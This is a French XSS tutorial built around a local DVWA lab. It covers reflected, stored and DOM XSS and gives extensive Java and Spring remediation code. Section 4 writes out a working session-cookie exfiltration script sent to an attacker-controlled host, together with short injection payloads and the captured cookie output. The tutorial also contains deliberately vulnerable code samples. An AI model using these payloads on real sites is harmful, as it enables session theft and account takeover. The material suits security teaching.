# Démonstration : Cross-Site Scripting (XSS) et méthodes de remédiation

---

## 1. Introduction aux failles XSS 

Les failles Cross-Site Scripting (XSS) permettent à un attaquant d'injecter du code JavaScript malveillant dans une application web. Ce code s'exécute dans le navigateur des victimes et peut :

- Voler des cookies de session et détourner des comptes
- Modifier le contenu de la page (phishing, défacement)
- Rediriger vers des sites malveillants
- Exécuter des actions au nom de l'utilisateur
- Exfiltrer des données sensibles

### Pourquoi les XSS sont-elles si dangereuses ?

- Elles exploitent la confiance que l'utilisateur a dans un site web
- Elles contournent la Same-Origin Policy du navigateur
- Elles peuvent être utilisées pour propager des vers (XSS worms)
- Les conséquences vont du vol de session à la compromission totale du compte
- Elles sont très répandues (présentes dans le Top 10 OWASP)

---

## 2. Types de failles XSS 

### 2.1. XSS Reflected (Réfléchie)

Le code malveillant est inclus dans la requête HTTP et immédiatement renvoyé dans la réponse.

**Caractéristiques** :
- Non persistant (ne reste pas en base)
- Nécessite que la victime clique sur un lien malveillant
- Impact immédiat mais limité à la victime qui clique

**Exemple de scénario** :
```
URL malveillante : https://site.com/search?q=<script>alert(document.cookie)</script>
```

L'attaquant envoie ce lien par email ou sur les réseaux sociaux. Quand la victime clique, le script s'exécute.

**Code vulnérable (Java)** :
```java
@GetMapping("/search")
public String search(@RequestParam String query, Model model) {
    // VULNÉRABLE - La valeur est directement affichée
    model.addAttribute("query", query);
    return "search"; // Thymeleaf : <p>Résultats pour : [[${query}]]</p>
}
```

### 2.2. XSS Stored (Persistante)

Le code malveillant est stocké dans la base de données et exécuté à chaque consultation.

**Caractéristiques** :
- Persistant (stocké en base)
- Impact massif : tous les utilisateurs qui consultent la page sont affectés
- Plus dangereux car ne nécessite pas d'interaction particulière de la victime
- Peut créer des vers XSS auto-propagateurs

**Exemple de scénario** :
Un attaquant poste un commentaire contenant `<script>/* code malveillant */</script>`. Tous les visiteurs qui consultent ce commentaire exécutent le code.

**Code vulnérable (Java)** :
```java
@PostMapping("/comment")
public String postComment(@RequestParam String content) {
    // VULNÉRABLE - Stockage sans validation
    Comment comment = new Comment();
    comment.setContent(content); // Contient : <script>alert(1)</script>
    commentRepository.save(comment);
    return "redirect:/comments";
}

@GetMapping("/comments")
public String showComments(Model model) {
    model.addAttribute("comments", commentRepository.findAll());
    return "comments"; // Thymeleaf : <div th:utext="${comment.content}"></div>
}
```

### 2.3. XSS DOM-Based (Basée sur le DOM)

Le code malveillant manipule le DOM directement côté client, sans passer par le serveur.

**Caractéristiques** :
- Entièrement côté client (JavaScript)
- Ne transite pas par le serveur dans la réponse HTTP
- Plus difficile à détecter avec des outils côté serveur
- Souvent liée à l'utilisation dangereuse de `innerHTML`, `document.write`, `eval()`

**Exemple de scénario** :
```javascript
// Code JavaScript vulnérable côté client
let name = new URLSearchParams(window.location.search).get('name');
document.getElementById('welcome').innerHTML = 'Bonjour ' + name;
```

URL : `https://site.com?name=<img src=x onerror=alert(1)>`

Le JavaScript récupère le paramètre et l'insère directement dans le DOM.

### 2.4. Comparaison des types

| Type | Stockage | Requiert interaction | Impact | Détection |
|------|----------|---------------------|---------|-----------|
| Reflected | Non | Oui (clic sur lien) | Ciblé | Facile |
| Stored | Oui (base) | Non | Massif | Facile |
| DOM-Based | Non | Variable | Variable | Difficile |

---

## 3. Démonstration pratique : DVWA 

### Configuration de l'environnement

```bash
# Lancer DVWA
docker run -d \
  --name dvwa \
  -p 8080:80 \
  vulnerables/web-dvwa

# Vérifier que le conteneur tourne
docker ps

# Voir les logs si besoin
docker logs -f dvwa

# Arrêter et supprimer
docker stop dvwa
docker rm dvwa
```

### Accès à DVWA

1. Ouvrir le navigateur : `http://localhost:8080`
2. Cliquer sur **"Create / Reset Database"**
3. Se connecter avec les identifiants par défaut :
   - **Username** : `admin`
   - **Password** : `password`
4. Aller dans **DVWA Security** (menu gauche) et sélectionner **"Low"**

### Démonstration XSS Reflected

1. Aller dans **XSS (Reflected)**
2. Dans le champ "What's your name?", saisir :
```html
<script>alert('XSS Reflected')</script>
```
3. Observer l'exécution du JavaScript

**Analyse** : Le paramètre est directement affiché dans la page sans échappement.

### Démonstration XSS Stored

1. Aller dans **XSS (Stored)**
2. Tester d'abord l'exécution simple :
```html
<script>alert('XSS Stored')</script>
```
3. Observer que le script s'exécute à chaque rechargement de la page

---

## 4. XSS Stored : Exfiltration de cookies

### Préparation du serveur d'exfiltration

Sur votre machine hôte, créer un serveur HTTP simple pour capturer les cookies :

```bash
# Se placer dans un répertoire de travail
cd ~/ProjetsGit/owasp-labs-juiceshop/dvwa

# Lancer un serveur HTTP Python sur le port 9000
python3 -m http.server 9000
```

Ce serveur affichera toutes les requêtes HTTP reçues dans le terminal.

### Créer le script d'exfiltration

Créer le fichier `p.js` qui exfiltre le cookie :

```bash
cat > p.js <<'JS'
new Image().src='http://10.20.204.87:9000/?c='+encodeURIComponent(document.cookie);
JS
```

Remplacer `10.20.204.87` par l'adresse IP de votre machine hôte.

```bash
ipconfig getifaddr en0
```

Vérifier que le script est accessible :
```bash
curl -I http://localhost:9000/p.js
# Devrait retourner : HTTP/1.0 200 OK
```

### Injecter le payload dans DVWA

1. Aller dans **XSS (Stored)**
2. Dans le champ **Message**, saisir ce payload (moins de 50 caractères) :
```html
<script src=//10.20.204.87:9000/p.js></script>
```
3. Soumettre le formulaire
4. Recharger la page

### Observer l'exfiltration

Dans le terminal où tourne `python3 -m http.server 9000`, vous devriez voir :

```
GET /p.js HTTP/1.1
GET /?c=PHPSESSID%3D9hm7...; security=low HTTP/1.1
```

Le cookie de session a été exfiltré. Un attaquant peut maintenant :
- Voler la session de l'administrateur
- Usurper l'identité de n'importe quel utilisateur
- Accéder aux données sensibles

### Vérifications avec les DevTools

1. Ouvrir **DevTools** → **Network**
2. Filtrer par `9000`
3. Observer les requêtes vers `p.js` et `/?c=`

4. Ouvrir **DevTools** → **Application** → **Cookies**
5. Vérifier si le flag `HttpOnly` est coché (il ne devrait pas l'être en niveau "Low")


### Autres payloads utiles (moins de 50 caractères)

```html
<!-- Test d'exécution simple -->
"><svg/onload=alert(1)>

<!-- Test avec image -->
"><img src=x onerror=alert(1)>

<!-- Test de connectivité vers le serveur d'exfil -->
"><img src=http://10.20.204.87:9000>
```

Multiples payloads : 
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

## 5. Remédiation et bonnes pratiques 

### Principe fondamental : Ne jamais faire confiance aux entrées utilisateur

Toute donnée provenant de l'utilisateur doit être échappée ou sanitizée avant d'être affichée dans une page HTML.

### Règle d'encodage contextuel

L'échappement doit être adapté au contexte d'insertion :

| Contexte | Caractères à échapper | Méthode |
|----------|----------------------|---------|
| HTML body | `< > & " '` | `htmlspecialchars()` / `StringEscapeUtils.escapeHtml4()` |
| Attribut HTML | `< > & " '` | Idem + guillemets |
| JavaScript | `\ ' " / < >` + contrôle | Échappement Unicode |
| URL | Caractères spéciaux | `URLEncoder.encode()` |
| CSS | Caractères spéciaux | Échappement hexadécimal |

### Méthodes de protection

#### 1. Échappement des sorties (Output Encoding) 

**Règle absolue** : Toujours échapper les données utilisateur avant de les afficher.

```java
// VULNÉRABLE
String html = "<div>" + userInput + "</div>";

// SÉCURISÉ
String html = "<div>" + StringEscapeUtils.escapeHtml4(userInput) + "</div>";
```

#### 2. Cookies sécurisés avec HttpOnly et Secure

**Protection contre l'exfiltration de cookies** :

```java
// Configuration du cookie de session
Cookie sessionCookie = new Cookie("JSESSIONID", sessionId);
sessionCookie.setHttpOnly(true);  // Empêche l'accès via document.cookie
sessionCookie.setSecure(true);     // Transmission uniquement en HTTPS
sessionCookie.setSameSite("Lax");  // Protection CSRF
sessionCookie.setPath("/");
response.addCookie(sessionCookie);
```

#### 3. Content Security Policy (CSP)

**Défense en profondeur** : Restreindre les sources de scripts autorisées.

```java
// Ajouter l'en-tête CSP
response.setHeader("Content-Security-Policy", 
    "default-src 'self'; " +
    "script-src 'self'; " +
    "object-src 'none'; " +
    "base-uri 'self';"
);
```

**Avantages** :
- Bloque l'exécution de scripts inline (`<script>alert(1)</script>`)
- Bloque les scripts externes non autorisés
- Empêche l'utilisation de `eval()`, `Function()`, etc.

#### 4. Validation des entrées (Input Validation)

**Principe** : Valider le format attendu, rejeter ce qui ne correspond pas.

```java
public boolean isValidUsername(String username) {
    // Autoriser uniquement lettres, chiffres, underscore
    return username.matches("^[a-zA-Z0-9_]{3,20}$");
}

if (!isValidUsername(input)) {
    throw new IllegalArgumentException("Format invalide");
}
```

#### 5. Sanitisation HTML (si HTML riche nécessaire)

**Cas d'usage** : Éditeurs WYSIWYG, forums permettant la mise en forme.

**Solution** : Utiliser une bibliothèque de sanitisation avec whitelist stricte.

```java
// Utilisation de OWASP Java HTML Sanitizer
PolicyFactory policy = new HtmlPolicyBuilder()
    .allowElements("p", "b", "i", "u", "em", "strong", "br")
    .allowAttributes("href").onElements("a")
    .requireRelNofollowOnLinks()
    .toFactory();

String safeHtml = policy.sanitize(userInput);
```

#### 6. En-têtes de sécurité supplémentaires

```java
// X-Content-Type-Options : empêche le MIME sniffing
response.setHeader("X-Content-Type-Options", "nosniff");

// X-Frame-Options : protection contre le clickjacking
response.setHeader("X-Frame-Options", "DENY");

// Referrer-Policy : contrôle des informations envoyées
response.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
```

---

## 6. Exemples de code sécurisé en Java 

### Exemple 1 : Recherche avec XSS Reflected (Spring MVC)

```java
@Controller
public class SearchController {
    
    // VERSION VULNÉRABLE - NE PAS UTILISER
    @GetMapping("/search-vulnerable")
    public String searchVulnerable(@RequestParam String query, Model model) {
        model.addAttribute("query", query);
        model.addAttribute("results", searchService.search(query));
        return "search";
    }
    
    // VERSION SÉCURISÉE - Avec Thymeleaf (échappement automatique)
    @GetMapping("/search")
    public String search(@RequestParam String query, Model model) {
        // Validation optionnelle
        if (query.length() > 100) {
            throw new IllegalArgumentException("Requête trop longue");
        }
        
        model.addAttribute("query", query); // Thymeleaf échappe automatiquement
        model.addAttribute("results", searchService.search(query));
        return "search";
    }
}
```

**Template Thymeleaf sécurisé** :
```html
<!-- SÉCURISÉ - th:text échappe automatiquement -->
<p>Résultats pour : <span th:text="${query}"></span></p>

<!-- VULNÉRABLE - th:utext n'échappe pas -->
<p>Résultats pour : <span th:utext="${query}"></span></p>
```

### Exemple 2 : Commentaires avec XSS Stored (Spring Boot + JPA)

```java
@RestController
@RequestMapping("/api/comments")
public class CommentController {
    
    @Autowired
    private CommentRepository commentRepository;
    
    // VERSION VULNÉRABLE - NE PAS UTILISER
    @PostMapping("/vulnerable")
    public Comment createCommentVulnerable(@RequestBody CommentDTO dto) {
        Comment comment = new Comment();
        comment.setContent(dto.getContent()); // Pas de validation/sanitization
        return commentRepository.save(comment);
    }
    
    // VERSION SÉCURISÉE - Avec validation et sanitization
    @PostMapping
    public Comment createComment(@RequestBody @Valid CommentDTO dto) {
        // Validation de la longueur
        if (dto.getContent().length() > 500) {
            throw new IllegalArgumentException("Commentaire trop long");
        }
        
        Comment comment = new Comment();
        // Le contenu sera échappé lors de l'affichage par Thymeleaf
        comment.setContent(dto.getContent());
        return commentRepository.save(comment);
    }
    
    @GetMapping
    public List<CommentDTO> getComments() {
        return commentRepository.findAll().stream()
            .map(this::toDTO)
            .collect(Collectors.toList());
    }
    
    private CommentDTO toDTO(Comment comment) {
        CommentDTO dto = new CommentDTO();
        dto.setId(comment.getId());
        // Échappement HTML avant envoi au client
        dto.setContent(StringEscapeUtils.escapeHtml4(comment.getContent()));
        dto.setAuthor(comment.getAuthor());
        dto.setCreatedAt(comment.getCreatedAt());
        return dto;
    }
}

// DTO avec validation
public class CommentDTO {
    private Long id;
    
    @NotBlank(message = "Le contenu ne peut pas être vide")
    @Size(max = 500, message = "Le commentaire ne peut pas dépasser 500 caractères")
    private String content;
    
    @NotBlank
    @Size(max = 50)
    private String author;
    
    private LocalDateTime createdAt;
    
    // getters/setters
}
```

**Template Thymeleaf pour afficher les commentaires** :
```html
<!-- SÉCURISÉ -->
<div th:each="comment : ${comments}">
    <p><strong th:text="${comment.author}">Auteur</strong></p>
    <p th:text="${comment.content}">Contenu</p>
    <small th:text="${comment.createdAt}">Date</small>
</div>
```

### Exemple 3 : Configuration des cookies de session (Spring Security)

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .sessionManagement()
                .sessionFixation().migrateSession()
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
            .and()
            .csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            .and()
            .headers()
                .contentSecurityPolicy("default-src 'self'; script-src 'self'; object-src 'none'")
                .and()
                .frameOptions().deny()
                .xssProtection().block(true)
                .and()
                .contentTypeOptions().and()
            .and()
            .authorizeRequests()
                .antMatchers("/public/**").permitAll()
                .anyRequest().authenticated();
        
        return http.build();
    }
    
    @Bean
    public ServletContextInitializer servletContextInitializer() {
        return servletContext -> {
            // Configuration des cookies de session
            SessionCookieConfig sessionCookieConfig = 
                servletContext.getSessionCookieConfig();
            sessionCookieConfig.setHttpOnly(true);
            sessionCookieConfig.setSecure(true); // Uniquement en HTTPS
            sessionCookieConfig.setMaxAge(3600); // 1 heure
            sessionCookieConfig.setName("SESSIONID");
        };
    }
}
```

**Configuration dans application.properties** :
```properties
# Cookie de session sécurisé
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.secure=true
server.servlet.session.cookie.same-site=lax
server.servlet.session.timeout=30m

# En-têtes de sécurité
server.error.include-message=never
server.error.include-stacktrace=never
```

### Exemple 4 : Filtre global pour les en-têtes de sécurité

```java
@Component
public class SecurityHeadersFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        
        // Content Security Policy
        httpResponse.setHeader("Content-Security-Policy", 
            "default-src 'self'; " +
            "script-src 'self' 'nonce-{random}'; " +
            "style-src 'self' 'unsafe-inline'; " +
            "img-src 'self' data: https:; " +
            "font-src 'self'; " +
            "connect-src 'self'; " +
            "frame-ancestors 'none'; " +
            "base-uri 'self'; " +
            "form-action 'self';"
        );
        
        // Autres en-têtes de sécurité
        httpResponse.setHeader("X-Content-Type-Options", "nosniff");
        httpResponse.setHeader("X-Frame-Options", "DENY");
        httpResponse.setHeader("X-XSS-Protection", "1; mode=block");
        httpResponse.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
        httpResponse.setHeader("Permissions-Policy", 
            "geolocation=(), microphone=(), camera=()");
        
        chain.doFilter(request, response);
    }
}
```

### Exemple 5 : Sanitisation HTML avec OWASP Java HTML Sanitizer

```java
@Service
public class ContentSanitizationService {
    
    private final PolicyFactory policy;
    
    public ContentSanitizationService() {
        // Politique stricte : autoriser uniquement certaines balises
        this.policy = new HtmlPolicyBuilder()
            .allowElements("p", "br", "strong", "em", "u", "b", "i")
            .allowElements("a")
            .allowAttributes("href").onElements("a")
            .requireRelNofollowOnLinks()
            .allowElements("ul", "ol", "li")
            .allowElements("h1", "h2", "h3", "h4", "h5", "h6")
            .toFactory();
    }
    
    /**
     * Sanitize HTML content from user input
     * Use this ONLY when you must allow rich HTML (e.g., WYSIWYG editors)
     */
    public String sanitizeHtml(String unsafeHtml) {
        if (unsafeHtml == null) {
            return "";
        }
        return policy.sanitize(unsafeHtml);
    }
    
    /**
     * For plain text, just escape - much safer
     */
    public String escapeHtml(String text) {
        if (text == null) {
            return "";
        }
        return StringEscapeUtils.escapeHtml4(text);
    }
}

@RestController
@RequestMapping("/api/articles")
public class ArticleController {
    
    @Autowired
    private ContentSanitizationService sanitizer;
    
    @PostMapping
    public Article createArticle(@RequestBody ArticleDTO dto) {
        Article article = new Article();
        
        // Titre : texte simple, échappement uniquement
        article.setTitle(sanitizer.escapeHtml(dto.getTitle()));
        
        // Contenu : HTML riche autorisé, sanitisation stricte
        article.setContent(sanitizer.sanitizeHtml(dto.getContent()));
        
        return articleRepository.save(article);
    }
}
```

### Exemple 6 : Protection contre XSS DOM-Based (côté client)

```javascript
// VULNÉRABLE - Utilisation de innerHTML
function displayUserName() {
    let name = new URLSearchParams(window.location.search).get('name');
    document.getElementById('welcome').innerHTML = 'Bonjour ' + name;
}

// SÉCURISÉ - Utilisation de textContent
function displayUserNameSecure() {
    let name = new URLSearchParams(window.location.search).get('name');
    document.getElementById('welcome').textContent = 'Bonjour ' + name;
}

// SÉCURISÉ - Avec DOMPurify pour HTML riche
function displayRichContent(html) {
    let clean = DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ['p', 'b', 'i', 'u', 'em', 'strong', 'br'],
        ALLOWED_ATTR: []
    });
    document.getElementById('content').innerHTML = clean;
}
```

**Intégration de DOMPurify dans le frontend** :
```html
<!-- Inclure DOMPurify -->
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>

<script>
// Utilisation sécurisée
const userInput = getUserInput();
const clean = DOMPurify.sanitize(userInput);
document.getElementById('output').innerHTML = clean;
</script>
```

---

## Checklist de sécurité XSS

Avant de mettre en production, vérifier :

- [ ] Tous les affichages utilisateur utilisent l'échappement HTML
- [ ] Les templates utilisent `th:text` au lieu de `th:utext` (Thymeleaf)
- [ ] Les cookies de session ont les flags `HttpOnly`, `Secure`, et `SameSite`
- [ ] Un Content Security Policy est configuré
- [ ] Les en-têtes de sécurité sont présents (X-Content-Type-Options, X-Frame-Options)
- [ ] La validation des entrées est en place
- [ ] Si HTML riche nécessaire, sanitisation avec whitelist stricte
- [ ] Pas d'utilisation de `innerHTML` côté client (préférer `textContent`)
- [ ] Pas d'utilisation de `eval()`, `Function()` côté client
- [ ] Les tests automatisés incluent des payloads XSS
- [ ] Le logging des tentatives XSS est activé
- [ ] Les violations CSP sont collectées et analysées

---

## Ressources complémentaires

- OWASP XSS Prevention Cheat Sheet : https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP Java HTML Sanitizer : https://github.com/OWASP/java-html-sanitizer
- DOMPurify : https://github.com/cure53/DOMPurify
- Content Security Policy (MDN) : https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- DVWA : https://github.com/digininja/DVWA

---

## Conclusion

Les failles XSS, en particulier les XSS Stored, représentent une menace sérieuse pour les applications web. La protection repose sur plusieurs principes fondamentaux :

1. **Échappement systématique des sorties** - Toujours échapper les données utilisateur avant affichage
2. **Cookies sécurisés avec HttpOnly** - Empêcher l'accès JavaScript aux cookies de session
3. **Content Security Policy** - Bloquer l'exécution de scripts non autorisés
4. **Défense en profondeur** - Cumuler plusieurs couches de protection
5. **Validation des entrées** - Rejeter les formats invalides
6. **Sanitisation HTML stricte** - Uniquement si HTML riche absolument nécessaire
